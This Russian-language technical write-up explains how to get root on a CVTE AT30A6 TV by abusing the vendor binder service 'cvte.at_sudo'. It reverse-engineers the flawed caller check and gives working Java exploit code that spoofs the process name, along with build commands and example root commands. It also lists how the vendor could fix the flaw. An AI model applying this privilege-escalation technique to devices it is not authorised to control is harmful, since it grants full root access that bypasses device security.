# Root через уязвимый сервис `cvte.at_sudo`

На AT30A6 есть вендорный (CVTE) сервис, который задуман как «sudo» для служебных приложений:
он принимает команду по binder'у и выполняет её **от root**. Проверки вызывающего оказались
обходимыми, поэтому из обычного `adb shell` (uid 2000) на этом ТВ получается полноценный
`uid=0(root)` без прошивки, разблокировки загрузчика и перезагрузки.

## Что за сервис

| | |
|---|---|
| Бинарь | `/vendor/bin/at_sudo` (уже запущен от root, `pid` виден в `ps -A`) |
| Binder-сервис | `cvte.at_sudo` (в `service list`) |
| Реализация | `android::AtSudo : android::BBinder`, `onTransact(...)` |
| Символы (из `.gnu_debugdata`) | `_ZN7android6AtSudo10onTransactEjRKNS_6ParcelEPS1_j`, `main` |

Разбор `onTransact` (thumb-код, адрес `0x2709`):

1. `IPCThreadState::getCallingUid()` — берётся uid вызывающего; допускаются **0, 1000, 2000**
   (`cmp r7, #0x3e8` / `#0x7d0`). Для остальных — лог `caller must be root/shell/system` и отказ.
   `getCallingPid()` кладётся рядом — из него строится путь.
2. Собирается `/proc/<pid>/cmdline`, файл открывается и читается до 128 байт; затем
   `strncmp` с двумя строками по 24 и 20 символов:
   * `com.cvte.factory.service` (**24 символа**);
   * `com.cvte.tv.api.impl` (**20 символов**).
   При успехе в лог идёт `caller package name = %s` и `Permission OK!`.
3. Транзакция **код 1**: `Parcel::readString16()` → `String8` → лог `[%s(L:%d)] CMD: %s`
   → `system(cmd)` **от root** → в ответ пишется `int` (код возврата `system()`).
   (Есть и код 2 — отдельная ветка, в наших целях не нужна.)

То есть защита построена на **имени процесса**, которое подделывается.

## Эксплуатация

Запускаем свой Java-класс через `app_process` от `shell` (uid 2000 — сервис это разрешает),
и первым делом меняем `argv[0]`:

```java
Process.setArgV0("com.cvte.factory.service", true);   // /proc/self/cmdline, ровно 24 символа
```

Исходный `argv[0]` у `app_process` — `/system/bin/app_process` (тоже 24 символа), поэтому новое
имя помещается в ту же память без переаллокации. Затем через `ServiceManager` берём `cvte.at_sudo`
и шлём транзакцию 1 с командой:

```java
IBinder b = (IBinder) Class.forName("android.os.ServiceManager")
        .getMethod("getService", String.class).invoke(null, "cvte.at_sudo");
Parcel data = Parcel.obtain(), reply = Parcel.obtain();
data.writeString("id");
b.transact(1, data, reply, 0);
int rc = reply.readInt();
```

Полный код — [`scripts/atsudo/AtSudo.java`](../scripts/atsudo/AtSudo.java), обёртка —
[`scripts/root.sh`](../scripts/root.sh).

### Сборка

Нужны JDK 17 и Android SDK (`build-tools;34.0.0`, `platforms;android-34`):

```bash
export JAVA_HOME=/path/to/jdk-17
export ANDROID_HOME=/path/to/android-sdk
scripts/atsudo/build.sh          # → scripts/atsudo/classes.dex
scripts/install-root-tool.sh     # → /data/local/tmp/atsudo.dex на ТВ
scripts/root.sh 'id'
```

Ожидаемый вывод:

```
uid=0(root) gid=0(root) groups=0(root) context=u:r:su:s0
```

`at_sudo` выполняет команду через `system()`, поэтому `root.sh` принимает обычную shell-строку:

```bash
scripts/root.sh 'setprop persist.adb.tcp.port 5555'
scripts/root.sh 'cat /proc/version'
scripts/root.sh 'mkdir -p /data/vendor/backup && cp -a /data/misc/adb /data/vendor/backup/'
```

## Почему это работает и чего не даёт

* **SELinux на этой прошивке — permissive** (`getenforce` → `Permissive`). Даже если бы политика
  запрещала `shell` вызывать `su`-домен, запрет только логировался бы. На enforcing-прошивке
  тот же вызов может быть заблокирован политикой.
* `at_sudo` работает в домене **`u:r:su:s0`** с полными правами — это настоящий root
  (`id` → `uid=0`), а не урезанный сервисный домен.
* Root **не переживает сброс к заводским настройкам** (файлы в `/data` пропадут) и не трогает
  разделы: `/system`, `/vendor`, `/product`, `/odm` остаются read-only, ничего не прошивается.
* Метод не требует уязвимости ядра и не зависит от версии Android — только от наличия
  `cvte.at_sudo` и permissive SELinux.

## Как это чинится вендором

* Не доверять `/proc/<pid>/cmdline` для аутентификации (имя процесса подделывается тривиально).
* Проверять подпись вызывающего APK / разрешение `signature|privileged`, а не uid 2000.
* Убрать `system()`-исполнение команд из сервиса; оставить фиксированный набор операций.

## Если `service call` «висит»

Прямой `adb shell service call cvte.at_sudo 1 s16 '...'` **не работает**: команда исполняется в
процессе `app_process` с именем, не совпадающим с ожидаемым, поэтому сервис её отклоняет
(а клиент ждёт ответ). Рабочий путь — только через `AtSudo` с подменой `argv[0]`.
